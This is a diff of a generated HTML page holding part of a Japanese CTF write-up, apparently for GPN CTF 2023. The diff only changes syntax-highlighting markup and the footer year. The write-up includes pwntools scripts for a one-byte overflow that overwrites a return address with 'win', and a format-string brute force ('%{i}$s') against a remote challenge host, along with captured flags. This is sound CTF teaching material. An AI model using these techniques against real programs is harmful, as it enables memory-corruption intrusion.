+<span class="giallo-l"><span style="color: #BB9AF7;">        if</span><span style="color: #9ABDF5;"> (length </span><span style="color: #BB9AF7;">&lt;=</span><span style="color: #C0CAF5;"> note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">budget</span><span style="color: #89DDFF;"> +</span><span style="color: #9ABDF5;"> lookback) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            fgets</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">buffer</span><span style="color: #89DDFF;"> +</span><span style="color: #7AA2F7;"> offset</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> length </span><span style="color: #89DDFF;">+</span><span style="color: #FF9E64;"> 2</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> stdin</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span><span style="color: #51597D;font-style: italic;"> // plus newline and null byte</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            uint32_t</span><span style="color: #9ABDF5;"> written </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> strcspn</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">buffer</span><span style="color: #89DDFF;"> +</span><span style="color: #7AA2F7;"> offset</span><span style="color: #89DDFF;">, &quot;\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> +</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            if</span><span style="color: #9ABDF5;"> (written </span><span style="color: #BB9AF7;">&gt;</span><span style="color: #9ABDF5;"> lookback) {</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">                note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">budget</span><span style="color: #89DDFF;"> -=</span><span style="color: #9ABDF5;"> written </span><span style="color: #89DDFF;">-</span><span style="color: #9ABDF5;"> lookback</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">                note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">pos</span><span style="color: #89DDFF;"> +=</span><span style="color: #9ABDF5;"> written </span><span style="color: #89DDFF;">-</span><span style="color: #9ABDF5;"> lookback</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">            }</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        }</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span><span style="color: #BB9AF7;"> else</span><span style="color: #9ABDF5;"> {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Maybe write something there first.</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
 <p><code>offset</code>は<code>pos</code>以下でなければならない。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span> hello, world!\n_______
-</span><span>|                |
-</span><span>+----------------+
-</span><span> ここまで
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span> hello, world!\n_______</span></span>
+<span class="giallo-l"><span>|                |</span></span>
+<span class="giallo-l"><span>+----------------+</span></span>
+<span class="giallo-l"><span> ここまで</span></span></code></pre>
 <p><code>lookback</code>は<code>pos-offset</code>となる。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>もしoffset=5だとしたら
-</span><span>                pos 14
-</span><span>                |
-</span><span> hello, world!\n_______
-</span><span>      |
-</span><span>      offset 5
-</span><span>
-</span><span>lookback = 9
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>もしoffset=5だとしたら</span></span>
+<span class="giallo-l"><span>                pos 14</span></span>
+<span class="giallo-l"><span>                |</span></span>
+<span class="giallo-l"><span> hello, world!\n_______</span></span>
+<span class="giallo-l"><span>      |</span></span>
+<span class="giallo-l"><span>      offset 5</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>lookback = 9</span></span></code></pre>
 <p><code>length</code>は<code>budget+lookback</code>以下でなければならない。<br />
 <code>budget</code>を超えないように、現在の<code>pos</code>の位置からoffsetがどれほど前に行くのかによって、渡された<code>length</code>を判定している。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>budget = 1024-14 = 1010
-</span><span>length &lt;= budget + lookback = 1019 = true
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>budget = 1024-14 = 1010</span></span>
+<span class="giallo-l"><span>length &lt;= budget + lookback = 1019 = true</span></span></code></pre>
 <p>それと、NULLbyteがついているから<code>length+2</code>だみたいなことを言っているが、NULLはどこで付与されているのだろうか。<code>fgets</code>にも付与されてはいなかった。<br />
 2で読み出す際、<code>puts</code>で読み出しており、NULLがあるなら止まるはずである。スタックを確認したが、ナルはなかった。<br />
 ここで注目したいのは<code>edit</code>の<code>fgets</code>が、<code>length+2</code>までを入力として許容する、かつ<code>length&lt;=1024</code>であることから、入力は最大<code>1026</code>バイトまで許容するということ。<br />
@@ -354,72 +340,68 @@ strcspnは改行を探し、それまでの文字数+1の数を書き込んだ�
 こうなると<code>offset</code>は確かに<code>buffer</code>の中央程度を指していることになり、そこから半分上書きしたとて、「開始位置をずらした<code>buffer</code>の限界(1024)」を超えることは難しいが、「本来のレイアウトにおける<code>buffer</code>の限界」は超えることが可能になる。<br />
 そして、本来のレイアウトの先にはリターンアドレスがあるため、これを上書きすることが、本来の<code>buffer</code>の下位1byteの値によっては可能になるというアイデア。<br />
 なのでもちろん2回目の<code>edit</code>は<code>win</code>のアドレスを敷き詰めている。また、下位を<code>ff</code>にずらしている以上、8byteにアラインされていないため、1byte余分に敷き詰めるか<code>offset</code>を7byte下げるかのどちらかをしないと、<code>win</code>のアドレスが整列しないため、<code>offset</code>は505バイトにして、<code>length</code>を512バイト(アドレス64個分)に設定しておいた。</p>
-<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
-</span><span>
-</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./chall</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p = </span><span style="color:#ffb964;">process</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./chall</span><span style="color:#556633;">&#39;</span><span>)
-</span><span style="color:#888888;">#p = remote(&quot;ironshire-of-mega-ultra-industry.gpn23.ctf.kitctf.de&quot;, &quot;443&quot;, ssl=True)
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">6. Quit\n</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">4</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">:</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">0</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">:</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">1024</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>payload = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">1024 </span><span>+ </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\xff</span><span style="color:#556633;">&#39; 
-</span><span>p.</span><span style="color:#ffb964;">send</span><span>(payload)
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">6. Quit\n</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">4</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">:</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">505</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">:</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">512</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>payload = </span><span style="color:#ffb964;">p64</span><span>(elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">win</span><span style="color:#556633;">&#39;</span><span>]) * </span><span style="color:#cf6a4c;">64
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">6. Quit\n</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">6</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #7DCFFF;">from</span><span> pwn</span><span style="color: #7DCFFF;"> import</span><span style="color: #89DDFF;"> *</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>elf</span><span style="color: #89DDFF;"> =</span><span> context</span><span style="color: #89DDFF;">.</span><span>binary</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> ELF</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">./chall</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> process</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">./chall</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">#p = remote(&quot;ironshire-of-mega-ultra-industry.gpn23.ctf.kitctf.de&quot;, &quot;443&quot;, ssl=True)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">6. Quit</span><span style="color: #89DDFF;">\n&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">4</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">:</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">0</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">:</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">1024</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>payload</span><span style="color: #89DDFF;"> =</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">A</span><span style="color: #89DDFF;">&#39;*</span><span style="color: #FF9E64;">1024</span><span style="color: #89DDFF;"> +</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&#39;\xff&#39;</span><span> </span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">payload</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">6. Quit</span><span style="color: #89DDFF;">\n&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">4</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">:</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">505</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">:</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">512</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>payload</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> p64</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">elf</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">sym</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">win</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">])</span><span style="color: #89DDFF;"> *</span><span style="color: #FF9E64;"> 64</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">payload</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">6. Quit</span><span style="color: #89DDFF;">\n&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">6</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">interactive</span><span style="color: #9ABDF5;">()</span></span></code></pre>
 <p><code>GPNCTF{NOW_yOU_5uRE1Y_ARE_RE4dY_7O_PWn_LaDybIRD!}</code></p>
 <h2 id="no-nc">no-nc</h2>
 <p>入力に<code>. / n c</code>が入っていると入力を受け付けない。<br />
 どうやらファイル自体にフラグがあり、また実行バイナリは<code>/nc</code>にあるらしい。<br />
 また、Dockerfileに<code>RUN gcc nc.c -o /nc -DRAW_FLAG="$FLAG"</code>という記述があり、<code>-DRAW_FLAG="$FLAG"</code>は<code>$FLAG</code>環境変数にある文字列を<code>RAW_FLAG</code>に注入している。<br />
 これコマンドライン引数だから、これを持っているメモリ領域を見たらフラグが見えるのでは？</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>snprintf(filename, (sizeof filename)-1, buf);
-</span><span>本来bufの箇所は &quot;%s&quot;, buf のように書かれるはずだが、bufだけになっているので書式文字列の脆弱性がある。
-</span><span>bufの箇所で指定された文字列(本来は書式文字列)が、(sizeof filename)-1だけfilenameに書き込まれる
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>snprintf(filename, (sizeof filename)-1, buf);</span></span>
+<span class="giallo-l"><span>本来bufの箇所は &quot;%s&quot;, buf のように書かれるはずだが、bufだけになっているので書式文字列の脆弱性がある。</span></span>
+<span class="giallo-l"><span>bufの箇所で指定された文字列(本来は書式文字列)が、(sizeof filename)-1だけfilenameに書き込まれる</span></span></code></pre>
 <p>というか<code>sizeof filename</code>はどう考えても8byteになってしまっており、1引いているので、7byteしか書き込めないことが分かる。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>calloc(200, 1);
-</span><span>ヒープに1byteの配列が200個作成
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>calloc(200, 1);</span></span>
+<span class="giallo-l"><span>ヒープに1byteの配列が200個作成</span></span></code></pre>
 <p>結局、書式文字列をブルートフォースしたら、なぜかバイナリファイル自体が読めてしまった。<br />
 どうやら<code>%71$s</code>で<code>./nc</code>という文字を読んだらしい。<br />
 これがそのまま<code>open("%71$s", 0)</code>に渡され、<code>open</code>がこれを<code>./nc</code>に展開し、実行バイナリをそのまま読み込んだため、バイナリにハードコードされているフラグが読めたということになる。</p>
-<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
-</span><span>
-</span><span>context.log_level = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">error</span><span style="color:#556633;">&#39;
-</span><span>
-</span><span style="color:#8fbfdc;">def </span><span style="color:#fad07a;">bruteforce</span><span>():
-</span><span>    i = </span><span style="color:#cf6a4c;">0
-</span><span>    </span><span style="color:#8fbfdc;">for </span><span>i </span><span style="color:#8fbfdc;">in </span><span style="color:#ffb964;">range</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, </span><span style="color:#cf6a4c;">9999</span><span>):
-</span><span>        p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">mountdale-of-epic-riches.gpn23.ctf.kitctf.de</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">443</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#ffb964;">ssl</span><span>=True)
-</span><span>        </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">trying </span><span>{i}</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>        </span><span style="color:#888888;">#p = remote(&#39;localhost&#39;, 1337)
-</span><span>        p.</span><span style="color:#ffb964;">recvline</span><span>() </span><span style="color:#888888;"># give me a file to read
-</span><span>        payload = </span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">%</span><span>{i}</span><span style="color:#99ad6a;">$s</span><span style="color:#556633;">&#39;
-</span><span>        p.</span><span style="color:#ffb964;">send</span><span>(payload)
-</span><span>        candidate = p.</span><span style="color:#ffb964;">recvall</span><span>().</span><span style="color:#ffb964;">decode</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">latin-1</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>        </span><span style="color:#8fbfdc;">if </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">GPN</span><span style="color:#556633;">&#39; </span><span>in candidate:
-</span><span>            </span><span style="color:#ffb964;">print</span><span>(candidate)
-</span><span>            </span><span style="color:#8fbfdc;">break
-</span><span>
-</span><span style="color:#ffb964;">bruteforce</span><span>()
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #7DCFFF;">from</span><span> pwn</span><span style="color: #7DCFFF;"> import</span><span style="color: #89DDFF;"> *</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>context</span><span style="color: #89DDFF;">.</span><span>log_level</span><span style="color: #89DDFF;"> = &#39;</span><span style="color: #9ECE6A;">error</span><span style="color: #89DDFF;">&#39;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> bruteforce</span><span style="color: #9ABDF5;">():</span></span>
+<span class="giallo-l"><span>    i</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 0</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    for</span><span> i</span><span style="color: #BB9AF7;"> in</span><span style="color: #0DB9D7;"> range</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">0</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 9999</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>        p</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> remote</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">mountdale-of-epic-riches.gpn23.ctf.kitctf.de</span><span style="color: #89DDFF;">&quot;, &quot;</span><span style="color: #9ECE6A;">443</span><span style="color: #89DDFF;">&quot;,</span><span style="color: #E0AF68;"> ssl</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">True</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">        print</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;trying </span><span style="color: #BB9AF7;">{</span><span style="color: #C0CAF5;">i</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        #p = remote(&#39;localhost&#39;, 1337)</span></span>
+<span class="giallo-l"><span>        p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span><span style="color: #51597D;font-style: italic;"> # give me a file to read</span></span>
+<span class="giallo-l"><span>        payload</span><span style="color: #89DDFF;"> =</span><span style="color: #BB9AF7;"> f</span><span style="color: #9ECE6A;">&#39;%</span><span style="color: #BB9AF7;">{</span><span style="color: #C0CAF5;">i</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">$s&#39;</span></span>
+<span class="giallo-l"><span>        p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">payload</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>        candidate</span><span style="color: #89DDFF;"> =</span><span> p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvall</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">decode</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">latin-1</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        if</span><span style="color: #89DDFF;"> &#39;</span><span style="color: #9ECE6A;">GPN</span><span style="color: #89DDFF;">&#39;</span><span style="color: #BB9AF7;"> in</span><span> candidate</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">            print</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">candidate</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            break</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">bruteforce</span><span style="color: #9ABDF5;">()</span></span></code></pre>
 <p><code>GPNCTF{up_and_D0wN_A11_ARound_60es_TH3_N_dIM3n5I0NA1_Circ13_WTf_Is_THis_flA6}</code></p>
 
         </div>
@@ -457,7 +439,7 @@ strcspnは改行を探し、それまでの文字数+1の数を書き込んだ�
         <div class="footer__inner">
                 <div class="copyright">
                         <span>© 
-    2025
+    2026
  Powered by <a href="https://www.getzola.org/">Zola</a></span>
                     <span class="copyright-theme">
                         <span class="copyright-theme-sep">:: </span>
